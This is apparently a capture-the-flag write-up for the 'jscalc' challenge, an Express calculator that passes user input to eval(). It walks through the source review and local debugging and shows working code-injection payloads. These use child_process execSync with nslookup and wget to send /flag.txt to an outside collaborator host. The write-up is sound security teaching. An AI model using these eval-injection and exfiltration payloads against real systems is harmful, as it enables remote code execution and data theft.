# jscalc

In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! ðŸ¦‘

This challenge is very straigth forward, we see on the main page that they use ```eval()```

## Source Code Review
Let check the flow on our input in the calculator function.
First modify package.json, Dockerfile and the build-docker.sh to attach our debugger form VSCode. The /routes files define the endpoint /api/calculate, our **formula** parameter pass to Calculator.calculate() function.

```javascript
router.post('/api/calculate', (req, res) => {
	let { formula } = req.body;

	if (formula) {
		result = Calculator.calculate(formula);
		return res.send(response(result));
	}

	return res.send(response('Missing parameters'));
})
```
the function is pretty simple
```javascript
    calculate(formula) {
        try {
            return eval(`(function() { return ${formula} ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
```
So if we can break the syntax, we shoul be able to get RCE, something like ```123;}())+console.log(1)//```
## Local Testing
We put a breakpoint on the return eval() line and pass our inpunt via BurpSuite

We are able to execute commands on the system. What command are able inside that docker container, after some test the approach i found was nslookup to exfiltrate flag.
```javascript
require('child_process').execSync('cat /flag.txt | base64 | xargs -I {} nslookup {}.burp.oastify.com')
```

## Proof of concept

That doesn't work for the challenge server so i have to change my payload to 
```json
{"formula":"123;}())+require('child_process').execSync('wget --post-data=$(cat /flag.txt) http://burp.oastify.com/ -O /dev/null')//"}
```
